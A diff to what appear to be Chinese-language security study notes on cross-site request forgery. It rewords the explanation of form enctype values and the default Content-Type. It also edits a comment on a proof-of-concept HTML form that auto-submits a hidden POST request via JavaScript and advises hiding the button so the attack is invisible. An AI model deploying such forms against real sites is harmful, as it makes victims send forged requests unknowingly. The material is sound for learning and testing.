@@ -161,7 +161,8 @@ Accept-Language: zh-CN,zh;q=0.9
   * 2.victim访问`http://www.3.com/demo` 实现POST-CSRF
 
 * 构造CSRF - 发出POST请求
-    * `form`标签支持的`enctype`属性的值 只有以下3种: 它可以指定该form表单提交时发出的http请求中的`Content-Type`值
+    * `enctype`属性的作用是: 指定该form表单提交时发出的http请求中的`Content-Type`值.
+    * `form`标签支持的`enctype`属性的值 只有以下3种:
       * 1.`<form enctype="application/x-www-form-urlencoded" ...` 默认情况
       * 2.`<form enctype="text/plain" ...`
       * 3.`<form enctype="multipart/form-data" ...`
@@ -172,7 +173,7 @@ Accept-Language: zh-CN,zh;q=0.9
 
 ```
 <!--
-如果没有设置form标签的`enctype`属性的值, 那么http req中的`Content-Type`值默认就是这个
+如果没有设置form标签的`enctype`属性的值, 那么所有form标签发起的http req中的`Content-Type`值默认就是这个
 Content-Type: application/x-www-form-urlencoded
 -->
 
@@ -182,7 +183,7 @@ Content-Type: application/x-www-form-urlencoded
       <input type="hidden" name="ip" value="1&#46;1&#46;1&#46;1" />
       <input type="hidden" name="offset" value="0" />
       <input type="hidden" name="limit" value="20" />
-      <input type="submit" value="send Request" /> <!--建议去掉这一行 即去掉可见的按钮 实现了"完全不可见" 且不会影响POST请求的发送 -->
+      <input type="submit" value="send Request" /> <!--建议去掉这一行 即去掉可见的按钮 通过JavaScript实现自动提交form 这样CSRF攻击过程实现了"不可见" 并且POST请求正常发出 -->
     </form>
 <script>document.getElementById("csrf-form").submit()</script>
 ```
